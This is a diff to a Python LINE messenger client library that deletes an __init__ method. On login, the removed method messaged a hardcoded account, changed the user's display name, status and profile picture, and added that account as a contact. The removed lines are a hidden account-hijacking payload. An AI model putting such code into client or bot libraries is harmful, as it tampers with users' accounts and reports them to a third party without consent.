@@ -202,22 +202,4 @@ class Object(object):
             raise Exception('Forward object failure.')
         return True
 
-    def __init__(self):
-        if self.isLogin == True:
-            self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
-            self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            linex = "u5cddc1ed7ed83dd61226e5bd229b0ccb"
-            xmod = self.getContact(linex).displayName
-            self.sendText("u5cddc1ed7ed83dd61226e5bd229b0ccb", 'Halo %s , Thanks for This' % xmod)
-            profile = self.getProfile()
-            profile.displayName = "🇮🇩I LOVE INDONESIA🇮🇩"
-            self.updateProfile(profile)
-            profile.statusMessage = "DRAGON PLAY KILL"
-            self.updateProfile(profile)
-            DPK = "http://dl.profile.line-cdn.net/0hmVj1XqsSMnlXSB_VDCtNLmsNPBQgZjQxLyovSicabB0vfiF6YiwoSnVIb0p9LHF8Pi1-FyFJPhsp"
-            LINE = self.downloadFileURL(DPK)
-            self.updateProfilePicture(LINE)
-            RIF = "u5cddc1ed7ed83dd61226e5bd229b0ccb"
-            self.findAndAddContactsByMid(RIF)
-
 
